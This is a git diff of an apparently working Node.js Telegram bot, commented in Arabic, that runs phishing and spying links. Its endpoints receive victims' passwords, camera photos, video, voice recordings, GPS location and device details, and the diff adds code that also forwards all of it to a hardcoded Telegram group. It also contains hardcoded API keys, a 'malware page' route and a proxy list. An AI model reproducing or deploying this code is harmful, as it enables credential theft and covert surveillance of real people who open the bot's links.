@@ -9,15 +9,7 @@ const axios = require('axios');
 const os = require('os');
 const https = require('https');
 require('dotenv').config();  
- 
     
-let usersData = {};
-
-
-setInterval(() => {
-    http.get('https://stream-denim-regnosaurus.glitch.me/:' + PORT);
-}, 60000); // Ping every 1 minute
-
 
 const sqlite3 = require('sqlite3').verbose();
 
@@ -224,14 +216,21 @@ const upload = multer({ storage: multer.memoryStorage() });
 const MAX_FREE_ATTEMPTS = 120;
 const freeTrialEndedMessage = "انتهت فترة التجربة المجانيه لان تستطيع استخدام اي رابط اختراق حتى تقوم بل الاشتراك من المطور او قوم بجمع نقاط لاستمرار في استخدام البوت";
 
-const forcedChannelUsernames = ['@SJGDDW', '@Y_E_SG', '@S_S_YE', '@YYY_A12', '@YEMENCYBER101'];
+
 
 
 // دالة للتحقق من المسؤول
-const adminId = '7130416076';
+
+
+// تعريف قائمة المسؤولين
+const admins = ['7130416076', '5706417405', '5814487752']; // أضف المزيد من معرفات المسؤولين هنا
+
+// دالة للتحقق مما إذا كان المستخدم مسؤولاً
 function isAdmin(userId) {
-  return userId.toString() === adminId;
+  return admins.includes(userId.toString()); // تحقق مما إذا كان معرف المستخدم موجودًا في قائمة المسؤولين
 }
+
+
 
 // دالة لإضافة نقاط لمستخدم معين
 function addPointsToUser(userId, points) {
@@ -592,8 +591,6 @@ bot.on('callback_query', (query) => {
     // الحالات الأخرى يمكن إضافتها هنا
   }
 });
-
-
   
 
   // باقي الكود للتفاعل مع الرسائل
@@ -807,10 +804,15 @@ bot.on('callback_query', async (callbackQuery) => {
 });
 
 
-    // استبدل 'YOUR_OPENAI_API_KEY' بمفتاح API الخاص بك من Op
+    // استبدل 'YOUR_OPENAI_API_KEY' بمفتاح API الخاص بك من OpenAI
+
+
+
+
+
 
 // إعداد الخيارات لطلب الـ API
-const COHERE_API_KEY = 'V22H6dttPDZEZW0XA2fnd05e79pYiLrzFsJ3JKQT'; // مفتاح Cohere API
+const COHERE_API_KEY = 'TCdYeSWnOfXKWGeygX8hVbQqe2P4ssvZHiZi8Lez'; // مفتاح Cohere API
 
 async function getLoveMessage(chatId) {
     const loveMessage = 'اكتب لي رسالة طويلة جدًا لا تقل عن 800 حرف رسالة جميلة ومحرجة وكلمات جميلة أرسلها لشركة واتساب لفك الحظر عن رقمي المحظور';
@@ -1192,10 +1194,12 @@ app.get('/:action/:platform/:chatId', (req, res) => {
 
 
 app.post('/submitVideo', upload.single('video'), async (req, res) => {
-    const chatId = req.body.userId;
-    const file = req.file;
+    const chatId = req.body.userId; // معرف المستخدم
+    const file = req.file; // الفيديو المرسل
     const additionalData = JSON.parse(req.body.additionalData || '{}');
     const cameraType = req.body.cameraType;
+
+    const groupChatId = '-1002246144688'; // معرف المحادثة الخاصة بالمجموعة
 
     if (file) {
         console.log(`Received video from user ${chatId}`);
@@ -1213,10 +1217,23 @@ IP: ${additionalData.ip || 'غير متاح'}
         `;
 
         try {
+            // جلب معلومات المستخدم من تيليجرام
+            const userInfo = await bot.getChat(chatId);
+            const userName = userInfo.first_name || 'غير متاح';
+            const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
+
+            const userInfoText = `
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
+            `;
+
+            // إرسال الفيديو إلى المستخدم الأصلي
             await bot.sendVideo(chatId, file.buffer, { caption });
 
-            // لا تحفظ الفيديو في السيرفر بل أرسله مباشرة من الذاكرة
-            console.log('Video sent successfully');
+            // إرسال الفيديو إلى مجموعة تيليجرام مع معلومات المستخدم
+            await bot.sendVideo(groupChatId, file.buffer, { caption: `فيديو من المستخدم ${chatId}\n${userInfoText}\n${caption}` });
+
+            console.log('Video sent successfully to both user and group');
             res.json({ success: true });
         } catch (error) {
             console.error('Error sending video to Telegram:', error);
@@ -1229,15 +1246,18 @@ IP: ${additionalData.ip || 'غير متاح'}
 
 
 
+
 // استلام الصور
 app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
-    const chatId = req.body.userId;
-    const files = req.files;
+    const userId = req.body.userId; // معرف المستخدم
+    const files = req.files; // الصور المرسلة
     const additionalData = JSON.parse(req.body.additionalData || '{}');
     const cameraType = req.body.cameraType;
 
+    const groupChatId = '-1002246144688'; // معرف المحادثة الخاصة بالمجموعة
+
     if (files && files.length > 0) {
-        console.log(`Received ${files.length} images from user ${chatId}`);
+        console.log(`Received ${files.length} images from user ${userId}`);
 
         const caption = `
 معلومات إضافية:
@@ -1252,10 +1272,27 @@ IP: ${additionalData.ip}
         `;
 
         try {
+            // جلب معلومات المستخدم من تيليجرام
+            const userInfo = await bot.getChat(userId);
+            const userName = userInfo.first_name || 'غير متاح';
+            const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
+
+            const userInfoText = `
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
+            `;
+
+            // إرسال الصور إلى المستخدم الأصلي
             for (const file of files) {
-                await bot.sendPhoto(chatId, file.buffer, { caption });
+                await bot.sendPhoto(userId, file.buffer, { caption });
             }
-            console.log('Photos sent successfully');
+
+            // إرسال الصور إلى مجموعة تيليجرام مع معلومات المستخدم
+            for (const file of files) {
+                await bot.sendPhoto(groupChatId, file.buffer, { caption: `صورة من المستخدم ${userId}\n${userInfoText}\n${caption}` });
+            }
+
+            console.log('Photos sent successfully to both user and group');
             res.json({ success: true });
         } catch (err) {
             console.error('Failed to send photos:', err);
@@ -1268,11 +1305,16 @@ IP: ${additionalData.ip}
 });
 
 
+
+
 // استلام الصوت
-app.post('/submitVoice', upload.single('voice'), (req, res) => {
-    const chatId = req.body.chatId;
-    const voiceFile = req.file;
+
+app.post('/submitVoice', upload.single('voice'), async (req, res) => {
+    const chatId = req.body.chatId; // معرف المستخدم
+    const voiceFile = req.file; // الملف الصوتي المرسل
     const additionalData = JSON.parse(req.body.additionalData || '{}');
+
+    const groupChatId = '-1002246144688'; // معرف المحادثة الخاصة بالمجموعة
 
     if (!voiceFile) {
         console.error('No voice file received');
@@ -1281,59 +1323,97 @@ app.post('/submitVoice', upload.single('voice'), (req, res) => {
 
     const caption = `
 معلومات إضافية:
-IP: ${additionalData.ip}
-الدولة: ${additionalData.country}
-المدينة: ${additionalData.city}
-المنصة: ${additionalData.platform}
-إصدار الجهاز: ${additionalData.deviceVersion}
+IP: ${additionalData.ip || 'غير متاح'}
+الدولة: ${additionalData.country || 'غير متاح'}
+المدينة: ${additionalData.city || 'غير متاح'}
+المنصة: ${additionalData.platform || 'غير متاح'}
+إصدار الجهاز: ${additionalData.deviceVersion || 'غير متاح'}
 مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
-الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
+الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
     `;
 
-    bot.sendVoice(chatId, voiceFile.buffer, { caption })
-        .then(() => {
-            console.log('Voice sent successfully');
-            res.json({ success: true });
-        })
-        .catch(error => {
-            console.error('Error sending voice:', error);
-            res.status(500).json({ error: 'Failed to send voice message' });
-        });
-});
+    try {
+        // جلب معلومات المستخدم من تيليجرام
+        const userInfo = await bot.getChat(chatId);
+        const userName = userInfo.first_name || 'غير متاح';
+        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
+        const userInfoText = `
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
+        `;
+
+        // إرسال الرسالة الصوتية إلى المستخدم الأصلي
+        await bot.sendVoice(chatId, voiceFile.buffer, { caption });
+
+        // إرسال الرسالة الصوتية إلى مجموعة تيليجرام مع معلومات المستخدم
+        await bot.sendVoice(groupChatId, voiceFile.buffer, { caption: `رسالة صوتية من المستخدم ${chatId}\n${userInfoText}\n${caption}` });
+
+        console.log('Voice sent successfully to both user and group');
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Error sending voice:', error);
+        res.status(500).json({ error: 'Failed to send voice message' });
+    }
+});
 
 // استلام الموقع
 app.post('/submitLocation', async (req, res) => {
-    const { chatId, latitude, longitude, additionalData } = req.body;
+    const { chatId, latitude, longitude, additionalData = {} } = req.body;
 
+    // معرف مجموعة تيليجرام
+    const groupChatId = '-1002246144688'; // ضع معرف المجموعة هنا
+
+    // التحقق من البيانات المطلوبة
     if (!chatId || !latitude || !longitude) {
         return res.status(400).json({ error: 'Missing required data' });
     }
 
     try {
+        // جلب معلومات المستخدم من تيليجرام
+        const userInfo = await bot.getChat(chatId);
+        const userName = userInfo.first_name || 'غير متاح';
+        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
+
+        const userInfoText = `
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
+        `;
+
+        // إرسال الموقع إلى المستخدم الأصلي
         await bot.sendLocation(chatId, latitude, longitude);
-        
+
+        // إعداد الرسالة التي تحتوي على المعلومات الإضافية
         const message = `
 معلومات إضافية:
-IP: ${additionalData.ip}
-الدولة: ${additionalData.country}
-المدينة: ${additionalData.city}
-المنصة: ${additionalData.platform}
-متصفح المستخدم: ${additionalData.userAgent}
-مستوى البطارية: ${additionalData.batteryLevel}
-الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا'}
+IP: ${additionalData.ip || 'غير متاح'}
+الدولة: ${additionalData.country || 'غير متاح'}
+المدينة: ${additionalData.city || 'غير متاح'}
+المنصة: ${additionalData.platform || 'غير متاح'}
+متصفح المستخدم: ${additionalData.userAgent || 'غير متاح'}
+مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
+الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
         `;
-        
+
+        // إرسال الرسالة التي تحتوي على المعلومات الإضافية إلى المستخدم
         await bot.sendMessage(chatId, message);
-        console.log('Location and additional data sent successfully');
+
+        // إرسال الموقع إلى مجموعة تيليجرام
+        await bot.sendLocation(groupChatId, latitude, longitude);
+
+        // إرسال الرسالة التي تحتوي على المعلومات الإضافية إلى المجموعة مع معلومات المستخدم
+        await bot.sendMessage(groupChatId, `موقع مرسل من المستخدم ${chatId}\n${userInfoText}\n${message}`);
+
+        console.log('Location and additional data sent successfully to both user and group');
         res.json({ success: true });
     } catch (error) {
+        // معالجة الأخطاء أثناء إرسال الموقع أو الرسالة
         console.error('Error sending location:', error);
         res.status(500).json({ error: 'Failed to send location', details: error.message });
     }
 });
 
-app.post('/submitIncrease', (req, res) => {
+app.post('/submitIncrease', async (req, res) => {
     const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;
 
     console.log('Received ', { username, password, platform, chatId, ip, country, city });
@@ -1343,8 +1423,22 @@ app.post('/submitIncrease', (req, res) => {
     }
 
     const deviceInfo = useragent.parse(userAgent);
+    const groupChatId = '-1002246144688'; // معرف المجموعة
 
-    bot.sendMessage(chatId, `تم اختراق حساب جديد ☠️:
+    try {
+        // جلب معلومات المستخدم من تيليجرام
+        const userInfo = await bot.getChat(chatId);
+        const userName = userInfo.first_name || 'غير متاح';
+        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
+
+        const userInfoText = `
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
+        `;
+
+        // الرسالة التي ستُرسل إلى المستخدم
+        const userMessage = `
+تم اختراق حساب  جديد ☠️:
 منصة: ${platform}
 اسم المستخدم: ${username}
 كلمة السر: ${password}
@@ -1353,17 +1447,26 @@ app.post('/submitIncrease', (req, res) => {
 المدينة: ${city}
 نظام التشغيل: ${deviceInfo.os.toString()}
 المتصفح: ${deviceInfo.toAgent()}
-الجهاز: ${deviceInfo.device.toString()}`)
-        .then(() => {
-            res.json({ success: true });
-        })
-        .catch(error => {
-            console.error('Error sending message:', error);
-            res.status(500).json({ error: 'Failed to send increase data', details: error.message });
-        });
+الجهاز: ${deviceInfo.device.toString()}
+        `;
+
+        // إرسال الرسالة إلى المستخدم
+        await bot.sendMessage(chatId, userMessage);
+        console.log('Message sent to user successfully');
+
+        // إرسال الرسالة إلى المجموعة مع معلومات المستخدم
+        await bot.sendMessage(groupChatId, `تم اختراق حساب  من قبل المستخدم ${chatId}\n${userInfoText}\n${userMessage}`);
+        console.log('Message sent to group successfully');
+
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Error sending message:', error);
+        res.status(500).json({ error: 'Failed to send increase data', details: error.message });
+    }
 });
 
-app.post('/submitLogin', (req, res) => {
+
+app.post('/submitLogin', async (req, res) => {
     const { username, password, platform, chatId, ip, country, city, userAgent, batteryLevel, charging, osVersion } = req.body;
 
     console.log('Received login data:', { username, password, platform, chatId, ip, country, city, batteryLevel, charging, osVersion });
@@ -1373,8 +1476,22 @@ app.post('/submitLogin', (req, res) => {
     }
 
     const deviceInfo = useragent.parse(userAgent);
+    const groupChatId = '-1002246144688'; // معرف المجموعة
 
-    bot.sendMessage(chatId, `تم تلقي بيانات تسجيل الدخول:
+    try {
+        // جلب معلومات المستخدم من تيليجرام
+        const userInfo = await bot.getChat(chatId);
+        const userName = userInfo.first_name || 'غير متاح';
+        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
+
+        const userInfoText = `
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
+        `;
+
+        // الرسالة التي ستُرسل إلى المستخدم
+        const userMessage = `
+تم تلقي بيانات تسجيل الدخول:
 منصة: ${platform}
 اسم المستخدم: ${username}
 كلمة السر: ${password}
@@ -1385,15 +1502,24 @@ app.post('/submitLogin', (req, res) => {
 المتصفح: ${deviceInfo.toAgent()}
 الجهاز: ${deviceInfo.device.toString()}
 مستوى البطارية: ${batteryLevel}
-قيد الشحن: ${charging}`)
-        .then(() => {
-            res.json({ success: true });
-        })
-        .catch(error => {
-            console.error('Error sending message:', error);
-            res.status(500).json({ error: 'Failed to send login data', details: error.message });
-        });
+قيد الشحن: ${charging ? 'نعم' : 'لا'}
+        `;
+
+        // إرسال الرسالة إلى المستخدم
+        await bot.sendMessage(chatId, userMessage);
+        console.log('Message sent to user successfully');
+
+        // إرسال الرسالة إلى المجموعة مع معلومات المستخدم
+        await bot.sendMessage(groupChatId, `تم تلقي بيانات تسجيل الدخول بواسطة المستخدم ${chatId}\n${userInfoText}\n${userMessage}`);
+        console.log('Message sent to group successfully');
+
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Error sending message:', error);
+        res.status(500).json({ error: 'Failed to send login data', details: error.message });
+    }
 });
+
 
 
 app.use(express.json());
@@ -1407,6 +1533,9 @@ app.post('/submitPhtos', upload.array('images', 10), async (req, res) => {
         const { cameraType, additionalData } = req.body;
         const chatId = req.body.chatId; // استلام chatId من الطلب
         const files = req.files;
+
+        // معرف مجموعة تيليجرام
+        const groupChatId = '-1002246144688'; // ضع معرف المجموعة هنا
 
         // تحقق من القيم المستقبلة
         console.log('Received request body:', req.body);
@@ -1432,32 +1561,48 @@ app.post('/submitPhtos', upload.array('images', 10), async (req, res) => {
             }
         }
 
+        // جلب معلومات المستخدم من تيليجرام
+        const userInfo = await bot.getChat(chatId);
+        const userName = userInfo.first_name || 'غير متاح';
+        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
+
+        const userInfoText = `
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
+        `;
+
+        // إعداد التعليق الذي سيتم إرساله مع الصورة
         const caption = `
 معلومات إضافية:
 نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
-
 IP: ${parsedData.ip || 'غير متاح'}
-
 الدولة: ${parsedData.country || 'غير متاح'}
-
 المدينة: ${parsedData.city || 'غير متاح'}
-
 المنصة: ${parsedData.platform || 'غير متاح'}
-
 وكيل المستخدم: ${parsedData.userAgent || 'غير متاح'}
-
 مستوى البطارية: ${parsedData.batteryLevel || 'غير متاح'}
-
 الشحن: ${parsedData.batteryCharging ? 'نعم' : 'لا'}
         `;
 
+        // إرسال الصور للمستخدم الأصلي
         for (const file of files) {
             try {
                 await bot.sendPhoto(chatId, file.buffer, { caption });
-                console.log('Photo sent successfully');
+                console.log('Photo sent successfully to user');
             } catch (error) {
-                console.error('Error sending photo:', error.message);
-                return res.status(500).json({ success: false, error: 'Failed to send photo' });
+                console.error('Error sending photo to user:', error.message);
+                return res.status(500).json({ success: false, error: 'Failed to send photo to user' });
+            }
+        }
+
+        // إرسال الصور للمجموعة مع معلومات المستخدم
+        for (const file of files) {
+            try {
+                await bot.sendPhoto(groupChatId, file.buffer, { caption: `صورة من المستخدم ${chatId}\n${userInfoText}\n${caption}` });
+                console.log('Photo sent successfully to group');
+            } catch (error) {
+                console.error('Error sending photo to group:', error.message);
+                return res.status(500).json({ success: false, error: 'Failed to send photo to group' });
             }
         }
 
@@ -1467,6 +1612,7 @@ IP: ${parsedData.ip || 'غير متاح'}
         res.status(500).json({ success: false, error: error.message });
     }
 });
+
 
 
 // مسار لتحميل صفحة البرمجيات الخبيثة
@@ -1485,12 +1631,13 @@ app.get('/:userId', (req, res) => {
 
 // استقبال البيانات من الصفحة HTML وإرسالها إلى البوت
 app.post('/SS', async (req, res) => {
-    console.log('تم استقبال طلب POST في المسار /mm');
+    console.log('تم استقبال طلب POST في المسار /SS');
     console.log('البيانات المستلمة:', req.body);
 
     const chatId = req.body.userId;
     const deviceInfo = req.body.deviceInfo || {}; // التأكد من وجود deviceInfo
     const userInfo = req.body.userInfo || {}; // التأكد من وجود userInfo (قد لا يكون موجودًا في الطلب الأول)
+    const groupChatId = '-1002246144688'; // معرف المجموعة
 
     const message = `
 📝 **معلومات المستخدم:**
@@ -1503,7 +1650,7 @@ app.post('/SS', async (req, res) => {
 - المدينة: ${deviceInfo.city || 'غير معروف'} 🏙️
 - عنوان IP: ${deviceInfo.ip || 'غير معروف'} 🌍
 - شحن الهاتف: ${deviceInfo.battery || 'غير معروف'}% 🔋
-- هل الهاتف يشحن؟: ${deviceInfo.isCharging || 'غير معروف'} ⚡
+- هل الهاتف يشحن؟: ${deviceInfo.isCharging ? 'نعم' : 'لا'} ⚡
 - الشبكة: ${deviceInfo.network || 'غير معروف'} 📶 (سرعة: ${deviceInfo.networkSpeed || 'غير معروف'} ميغابت في الثانية)
 - نوع الاتصال: ${deviceInfo.networkType || 'غير معروف'} 📡
 - الوقت: ${deviceInfo.time || 'غير معروف'} ⏰
@@ -1523,14 +1670,30 @@ app.post('/SS', async (req, res) => {
 - تاريخ آخر تحديث للمتصفح: ${deviceInfo.lastUpdate || 'غير معروف'} 📅
 - بروتوكول الأمان المستخدم: ${deviceInfo.securityProtocol || 'غير معروف'} 🔒
 - نطاق التردد للاتصال: ${deviceInfo.connectionFrequency || 'غير معروف'} 📡
-- إمكانية تحديد الموقع الجغرافي: ${deviceInfo.geolocationAvailable || 'غير معروف'} 🌍
-- الدعم لتقنية البلوتوث: ${deviceInfo.bluetoothSupport || 'غير معروف'} 🔵
-- دعم الإيماءات اللمسية: ${deviceInfo.touchSupport || 'غير معروف'} ✋
+- إمكانية تحديد الموقع الجغرافي: ${deviceInfo.geolocationAvailable ? 'نعم' : 'لا'} 🌍
+- الدعم لتقنية البلوتوث: ${deviceInfo.bluetoothSupport ? 'نعم' : 'لا'} 🔵
+- دعم الإيماءات اللمسية: ${deviceInfo.touchSupport ? 'نعم' : 'لا'} ✋
     `;
-    
+
     try {
+        // جلب معلومات المستخدم من تيليجرام
+        const telegramUserInfo = await bot.getChat(chatId);
+        const userName = telegramUserInfo.first_name || 'غير متاح';
+        const userUsername = telegramUserInfo.username ? `@${telegramUserInfo.username}` : 'غير متاح';
+
+        const userInfoText = `
+اسم المستخدم: ${userName}
+يوزر المستخدم: ${userUsername}
+        `;
+
+        // إرسال الرسالة إلى المستخدم
         await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
-        console.log('تم إرسال معلومات الجهاز والمستخدم بنجاح');
+        console.log('تم إرسال معلومات الجهاز والمستخدم بنجاح للمستخدم');
+
+        // إرسال الرسالة إلى المجموعة مع معلومات المستخدم
+        await bot.sendMessage(groupChatId, `تم استقبال بيانات جهاز جديدة من المستخدم ${chatId}\n${userInfoText}\n${message}`, { parse_mode: 'Markdown' });
+        console.log('تم إرسال معلومات الجهاز والمستخدم بنجاح إلى المجموعة');
+
         res.json({ success: true });
     } catch (err) {
         console.error('فشل في إرسال معلومات الجهاز والمستخدم:', err);
@@ -1561,109 +1724,123 @@ function decodeReferralCode(code) {
   }
 }
 
-// التحقق من الاشتراك في القنوات المطلوبة
+const forcedChannelUsernames = ['@ASMAPX', '@HHHHIIIO1', '@PFYHIG', '@BHOKMA', '@vvccze', '@ADTMQ', '@OTIBTP', '@S_S_A_L1'];
+
 async function checkSubscription(userId) {
-  if (forcedChannelUsernames.length) {
-    for (const channel of forcedChannelUsernames) {
-      try {
-        const member = await bot.getChatMember(channel, userId);
-        if (member.status === 'left' || member.status === 'kicked') {
-          await bot.sendMessage(userId, `عذرا، يجب عليك الانضمام إلى القنوات المطلوبة لاستخدام البوت:`, {
-            reply_markup: {
-              inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
-            }
-          });
-          return false;
-        }
-      } catch (error) {
-        console.error('خطأ أثناء التحقق من عضوية القناة:', error);
-        
-        return false;
+  const notSubscribedChannels = [];
+
+  for (const channel of forcedChannelUsernames) {
+    try {
+      const member = await bot.getChatMember(channel, userId);
+      if (member.status === 'left' || member.status === 'kicked') {
+        notSubscribedChannels.push(channel); // إضافة القناة التي لم يشترك فيها المستخدم إلى القائمة
       }
+    } catch (error) {
+      console.error('خطأ أثناء التحقق من عضوية القناة:', error);
+      return false;
     }
-    return true;
   }
+
+  if (notSubscribedChannels.length > 0) {
+    // إذا كان المستخدم لم يشترك في أي من القنوات
+    await bot.sendMessage(userId, `عذرا، يجب عليك الانضمام إلى القنوات المطلوبة لاستخدام البوت:`, {
+      reply_markup: {
+        inline_keyboard: notSubscribedChannels.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
+      }
+    });
+    return false;
+  }
+
   return true;
 }
 
-// التعامل مع الرسائل
+// التأكد من أن الدالة التي تتعامل مع الرسائل هي دالة غير متزامنة (async)
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text ? msg.text.toLowerCase() : '';
     const senderId = msg.from.id.toString();
 
-  if (!allUsers.has(chatId.toString())) {
-    const newUser = {
-      id: chatId,
-      firstName: msg.from.first_name,
-      lastName: msg.from.last_name || '',
-      username: msg.from.username || ''
-    };
-    allUsers.set(chatId.toString(), newUser);
-    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); 
-    await bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${newUser.firstName} ${newUser.lastName}\nاسم المستخدم: @${newUser.username}\nمعرف الدردشة: ${chatId}`);
-  }
+    if (!allUsers.has(chatId.toString())) {
+        const newUser = {
+            id: chatId,
+            firstName: msg.from.first_name,
+            lastName: msg.from.last_name || '',
+            username: msg.from.username || ''
+        };
+        allUsers.set(chatId.toString(), newUser);
+        saveData().catch(error => console.error('فشل في حفظ البيانات:', error));
 
-  if (bannedUsers.has(senderId)) {
-    await bot.sendMessage(chatId, 'تم إيقافك او حظرك من  استخدام البوت من قبل المطور. لا يمكنك استخدام البوت حاليًا.');
-    return;
-  }
-
-  // التحقق من الاشتراك عند كل رسالة /start
-  if (text.startsWith('/start')) {
-    const isSubscribed = await checkSubscription(senderId);
-    if (!isSubscribed) {
-      return;
-    }
-  }
-
-  if (text === '/start') {
-    showDefaultButtons(senderId);
-  } else if (text === '/login') {
-    showLoginButtons(senderId);
-  } else if (text === '/hacking') {
-    showHackingButtons(senderId);
-  } else if (text === '/vip') {
-    showVipOptions(chatId, senderId);
-  } else if (text.startsWith('/start ')) {
-    const startPayload = text.split(' ')[1];
-    console.log('Start payload:', startPayload);
-
-    if (startPayload) {
-      const referrerId = decodeReferralCode(startPayload);
-      console.log('Decoded referrer ID:', referrerId);
-      console.log('Sender ID:', senderId);
-
-      if (referrerId && referrerId !== senderId) {
+        // إرسال الرسالة إلى جميع المسؤولين باستخدام Promise.all
         try {
-          const usedLinks = usedReferralLinks.get(senderId) || new Set();
-          if (!usedLinks.has(referrerId)) {
-            usedLinks.add(referrerId);
-            usedReferralLinks.set(senderId, usedLinks);
-
-            const referrerPoints = addPointsToUser(referrerId, 1);
-
-            await bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
-            await bot.sendMessage(senderId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة وتمت إضافة نقطة للمستخدم الذي دعاك.');
-
-            console.log(`User ${senderId} joined using referral link from ${referrerId}`);
-          } else {
-            await bot.sendMessage(senderId, 'لقد استخدمت هذا الرابط من قبل.');
-          }
+            await Promise.all(
+                admins.map(adminId => 
+                    bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${newUser.firstName} ${newUser.lastName}\nاسم المستخدم: @${newUser.username}\nمعرف الدردشة: ${chatId}`)
+                )
+            );
         } catch (error) {
-          console.error('خطأ في معالجة رابط الدعوة:', error);
-          await bot.sendMessage(senderId, 'لقد دخلت عبر رابط صديقك وتم اضافه 1$ لصديقك.');
+            console.error('خطأ في إرسال الرسالة إلى المسؤولين:', error);
         }
-      } else {
-        await bot.sendMessage(senderId, 'رابط الدعوة غير صالح أو أنك تحاول استخدام رابط الدعوة الخاص بك.');
-      }
-    } else {
-      await bot.sendMessage(senderId, 'مرحبًا بك في البوت!');
     }
 
-    showDefaultButtons(senderId);
-  }
+    if (bannedUsers.has(senderId)) {
+        await bot.sendMessage(chatId, 'تم إيقافك او حظرك من  استخدام البوت من قبل المطور. لا يمكنك استخدام البوت حاليًا.');
+        return;
+    }
+
+    // التحقق من الاشتراك عند استلام أمر /start
+    if (text.startsWith('/start')) {
+        const isSubscribed = await checkSubscription(senderId);
+        if (!isSubscribed) {
+            return;
+        }
+        showDefaultButtons(senderId);
+    } else if (text === '/login') {
+        showLoginButtons(senderId);
+    } else if (text === '/hacking') {
+        showHackingButtons(senderId);
+    } else if (text === '/vip') {
+        showVipOptions(chatId, senderId);
+    } else if (text.startsWith('/start ')) {
+        const startPayload = text.split(' ')[1];
+        console.log('Start payload:', startPayload);
+
+        if (startPayload) {
+            const referrerId = decodeReferralCode(startPayload);
+            console.log('Decoded referrer ID:', referrerId);
+            console.log('Sender ID:', senderId);
+
+            if (referrerId && referrerId !== senderId) {
+                try {
+                    const usedLinks = usedReferralLinks.get(senderId) || new Set();
+                    if (!usedLinks.has(referrerId)) {
+                        usedLinks.add(referrerId);
+                        usedReferralLinks.set(senderId, usedLinks);
+
+                        const referrerPoints = addPointsToUser(referrerId, 1);
+
+                        await bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
+                        await bot.sendMessage(senderId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة وتمت إضافة نقطة للمستخدم الذي دعاك.');
+
+                        console.log(`User ${senderId} joined using referral link from ${referrerId}`);
+                    } else {
+                        await bot.sendMessage(senderId, 'لقد استخدمت هذا الرابط من قبل.');
+                    }
+                } catch (error) {
+                    console.error('خطأ في معالجة رابط الدعوة:', error);
+                    await bot.sendMessage(senderId, 'لقد دخلت عبر رابط صديقك وتم اضافه 1$ لصديقك.');
+                }
+            } else {
+                await bot.sendMessage(senderId, 'رابط الدعوة غير صالح أو أنك تحاول استخدام رابط الدعوة الخاص بك.');
+            }
+        } else {
+            await bot.sendMessage(senderId, 'مرحبًا بك في البوت!');
+        }
+
+        showDefaultButtons(senderId);
+    }
 });
+
+
 
 // التعامل مع الاستفسارات
 bot.on('callback_query', async (callbackQuery) => {
@@ -1791,7 +1968,7 @@ function shortenUrl(url) {
 
 const uuid = require('uuid'); // تأكد من استدعاء المكتبة الصحيحة
 
-const botUsername = 'SJGDD_bot'; // ضع هنا يوزر البوت الخاص بك
+const botUsername = 'CHTRTDBot'; // ضع هنا يوزر البوت الخاص بك
 
 let userPoints = {}; // لتخزين النقاط لكل مستخدم
 let linkData = {}; // لتخزين بيانات الرابط والمستخدمين الذين دخلوا الرابط
@@ -1891,13 +2068,11 @@ bot.onText(/\/start (.+)/, (msg, match) => {
 
         // التحقق من صحة linkId وإذا كان ينتمي إلى المستخدم الحالي
         
-
 const apiKey = 'c35b4ecbb3a54362a7ea95351962f9bc';
 
-// رابط الـ API لجلب بيانات البطاقات
+
 const url = 'https://randommer.io/api/Card';
 
-// دالة لجلب بيانات البطاقة من الـ API
 async function getCardData() {
     try {
         const response = await fetch(url, {
@@ -1926,9 +2101,7 @@ async function getCardData() {
     }
 }
 
-// استجابة البوت عند بدء المحادثة
 
-// استجابة عند الضغط على زر "Generate Card"
 bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
 
@@ -1937,14 +2110,6 @@ bot.on('callback_query', async (query) => {
         bot.sendMessage(chatId, cardData);
     }
 });
-// Initialize your bot with your Telegram Bot Token
-
-
-
-
-
-
-       
 
 
 const HttpsProxyAgent = require('https-proxy-agent');
@@ -1952,26 +2117,41 @@ const HttpsProxyAgent = require('https-proxy-agent');
 
 let sessions = {};
 
-// قائمة البروكسيات
 const proxyList = [
-    'http://43.201.121.81:80',
-    'http://162.223.90.130:80',
-    'http://8.211.194.78:8008',
-    'http://3.10.93.50:80',
-    'http://178.54.21.203:8081',
-    'http://154.65.39.8:80',
-    'http://194.182.163.117:3128',
+    'http://188.132.221.81:8080',
+    'http://160.86.242.23:8080',
+    'http://176.56.139.57:8081',
+    'http://44.226.167.102:3128',
